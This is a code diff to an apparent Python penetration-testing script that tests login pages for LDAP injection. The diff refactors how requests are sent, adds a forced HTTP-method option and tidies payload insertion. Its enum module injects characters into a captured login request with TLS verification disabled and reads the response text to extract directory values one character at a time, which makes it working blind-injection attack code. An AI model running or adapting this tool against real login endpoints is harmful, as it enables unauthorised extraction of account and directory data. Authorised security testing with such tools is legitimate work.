@@ -16,6 +16,33 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
+def send(args, url_str, header_json, data_json, proxy, method, form="json"):
+  r = None
+  if method == "POST":
+    if form == "json":
+      r = requests.post(url_str, headers=header_json, json=data_json, proxies=proxy, verify=False)
+    else:
+      r = requests.post(url_str, headers=header_json, data=data_json, proxies=proxy, verify=False)
+  elif method == "GET":
+      r = requests.get(url_str, headers=header_json, params=data_json, proxies=proxy, verify=False)
+  else:
+    print("[-] Error: method {} not implemented. Try with GET or POST.".format(method))
+    exit(-1)
+
+  #sleep(0.5) #Avoid brute-force bans
+  return r
+
+
+def login(args, url_str, header_json, data_json, proxy, method, form="json"):
+  """ 
+  url_str: string 
+  header_json: json
+  data_json: json
+  """
+
+
+
+
 def enum(args, url_str, header_json, data_json, proxy, method, form="json"):
   """ 
   url_str: string 
@@ -37,26 +64,28 @@ def enum(args, url_str, header_json, data_json, proxy, method, form="json"):
         # if base64 encoded:
         if args.encode:
           query = base64.b64encode(query.encode("utf-8")).decode("utf-8")
+        else:
+          # workaround: escaping " with \"
+          query = query.replace("\"", "\\\"")
+
         logging.debug("payload: {}".format(query))
 
-        data_str = json.dumps(data_json).replace(args.insertionTag, query)
-        data_json_t = json.loads(data_str)
+        data_json_t = data_json
+        try:
+          data_str = json.dumps(data_json).replace(args.insertionTag, query)
+          data_json_t = json.loads(data_str)
+        except:
+          print("\n[-] Warning: Payload processing failed in query {}".format(query))
 
-        header_str = json.dumps(header_json).replace(args.insertionTag, query)
-        header_json_t = json.loads(header_str)
+        header_json_t = header_json
+        try:
+          header_str = json.dumps(header_json).replace(args.insertionTag, query)
+          header_json_t = json.loads(header_str)
+        except:
+          print("\n[-] Warning: Payload processing failed in query {}".format(query))
 
-        if method == "POST":
-          if form == "json":
-            r = requests.post(url_str, headers=header_json_t, json=data_json_t, proxies=proxy, verify=False)
-          else:
-            r = requests.post(url_str, headers=header_json_t, data=data_json_t, proxies=proxy, verify=False)
-        elif method == "GET":
-          r = requests.get(url_str, headers=header_json_t, params=data_json_t, proxies=proxy, verify=False)
-        else:
-          print("[-] Error: method {} not implemented. Try with GET or POST.".format(method))
-          exit(-1)
-
-        #sleep(0.5) #Avoid brute-force bans
+        # prepare and send the request
+        r = send(args, url_str, header_json_t, data_json_t, proxy, method, form)
 
         if "Cannot login" in r.text and not ("not valid" in r.text or "Malformed" in r.text):
           value += str(char)
@@ -135,7 +164,6 @@ def calculateInsertionPoint(args, url_json, header_json, data_json):
 def main():
   # TODO: Splash screen
 
-  # TODO: add method parameter
   parser = argparse.ArgumentParser(description="Test a login page for LDAP injection.")
   parser.add_argument('-r', '--req', dest='requestFile', type=str, required=True, help="Request file. For example copied from Burp.")  
   parser.add_argument('-t', '--tag', dest="insertionTag", type=str, default='*', help="Insertion point. Default *. Marks the spot for LDAP insertion.")
@@ -143,6 +171,7 @@ def main():
   parser.add_argument('--proxy', dest='proxy', type=str, default='', help="Use a proxy to connect to the target URL. Example: --proxy 127.0.0.1:8080")
   parser.add_argument('--encode', dest='encode', action='store_true', help="Base64-encode the payload.")
   parser.add_argument('--module', dest='module', type=str, default='enum', help="The module to use: login (TODO), enum, dump (TODO)")
+  parser.add_argument('--method', dest='method', type=str, default='', help="Force using a given HTTP method.")
   parser.add_argument('--loglevel', dest='loglevel', default='WARNING', help="DEBUG, INFO, WARNING, ERROR")
   args = parser.parse_args()
 
@@ -163,6 +192,8 @@ def main():
 
   # extract get parameters (if any) from url
   method, resource_name = Burpee.burpee.get_method_and_resource(args.requestFile)
+  if args.method != '':
+    method = args.method
   url_parsed = urlparse(resource_name)
   url_str = args.protocol + "://" + header_json["Host"] + url_parsed.path
   url_json = parse_qs(url_parsed.query)
